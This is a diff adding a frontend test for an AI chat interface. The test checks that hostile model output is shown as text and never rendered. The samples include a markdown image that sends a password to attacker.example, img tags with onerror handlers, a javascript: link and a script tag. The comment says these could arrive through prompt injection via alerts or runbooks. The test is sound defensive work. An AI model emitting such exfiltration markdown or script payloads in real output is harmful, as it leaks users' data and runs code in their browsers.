@@ -172,6 +172,37 @@ describe('Chat', () => {
     expect(screen.getByRole('status')).toHaveTextContent('2 runbook sections')
   })
 
+  // The model's words, and a runbook's headings, are written by whoever can
+  // write an alert or a runbook (prompt injection). Rendered as text, a
+  // markdown image or <img> carrying data out to another site is shown, not
+  // fetched, and a script is shown, not run. Rendering markdown here would
+  // turn an injected answer into data exfiltration (OWASP LLM05).
+  it('shows markup and markdown from the model as text: nothing loads, nothing runs', async () => {
+    const stream = controllableStream()
+    await ask()
+    const hostile = [
+      '![status](https://attacker.example/leak?d=db-1%20password)',
+      '<img src="https://attacker.example/x" onerror="alert(1)">',
+      '[fix it](javascript:alert(1)) <script>alert(2)</script>',
+    ].join('\n')
+    stream.send('meta', { request_id: 'r1', model: 'm', alerts_in_context: 1 })
+    stream.send('token', { delta: hostile })
+    stream.send('done', {
+      usage: null,
+      ttft_ms: 10,
+      duration_ms: 20,
+      finish_reason: 'stop',
+      citations: [{ ref: 'R1', runbook_id: 7, title: 't', heading: '<img src=x onerror=alert(3)>' }],
+      invalid_citations: [],
+    })
+    stream.close()
+    await waitFor(() => expect(answer()).toBe(hostile))
+    await screen.findByRole('region', { name: 'Referenced runbook sections' })
+    for (const tag of ['img', 'script', 'a', 'iframe']) {
+      expect(document.querySelector(`.panel ${tag}`)).toBeNull()
+    }
+  })
+
   it('says so when runbooks were searched by keyword only', async () => {
     const stream = controllableStream()
     await ask()
